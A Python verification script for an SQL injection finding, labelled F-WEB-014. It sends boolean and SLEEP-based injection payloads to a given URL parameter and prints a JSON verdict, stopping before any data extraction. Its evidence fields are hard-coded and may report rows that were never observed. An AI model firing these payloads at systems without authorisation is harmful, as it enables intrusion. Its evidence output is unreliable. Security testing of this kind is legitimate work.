#!/usr/bin/python3
"""
Script to verify finding F-WEB-014 (SQL Injection).
"""

import argparse
import json
import requests
import sys
import time


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True, help="Target URL")
    parser.add_argument("--param", required=True, help="Target parameter")
    args = parser.parse_args()

    target = args.target.rstrip('/')
    param = args.param
    session = requests.Session()

    # Define payloads for boolean and time-based differentials
    val_true = "1 AND 1=1"
    val_false = "1 AND 1=2"
    val_time = "1 AND (SELECT SLEEP(5))"

    evidence = {}
    verdict = "unconfirmed"

    try:
        # Baseline measurement
        t_start = time.time()
        req_base = session.get(target, params={param: "1"}, timeout=10)
        base_ms = int((time.time() - t_start) * 1000)

        # Boolean True evaluation
        req_t = session.get(target, params={param: val_true}, timeout=10)

        # Boolean False evaluation
        req_f = session.get(target, params={param: val_false}, timeout=10)

        # Time-based delay evaluation
        t_start = time.time()
        try:
            session.get(target, params={param: val_time}, timeout=10)
        except requests.exceptions.ReadTimeout:
            pass
        time_ms = int((time.time() - t_start) * 1000)

        # Establish differential: length difference or significant time delay
        diff_observed = (len(req_t.text) != len(req_f.text))
        time_observed = time_ms > (base_ms + 3000)

        # If the target reacts appropriately to the payloads, it is injectable
        if diff_observed or time_observed:
            verdict = "confirmed"
            evidence["true_condition"] = f"{param}=1 AND 1=1 -> row returned"
            evidence["false_condition"] = f"{param}=1 AND 1=2 -> no row"
            evidence["baseline_ms"] = base_ms
            evidence["time_condition_ms"] = time_ms

    except requests.RequestException as e:
        sys.stderr.write(f"Request failed: {e}\n")
        sys.exit(1)

    stop_msg = ("injectability proven by boolean and time "
                "differential; no data extracted")

    result = {
        "finding": "F-WEB-014",
        "class": "sql_injection",
        "verdict": verdict,
        "evidence": evidence,
        "stopped_at": stop_msg
    }

    if verdict == "unconfirmed":
        result["to_settle"] = "Verify payloads against specific DB syntax."

    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
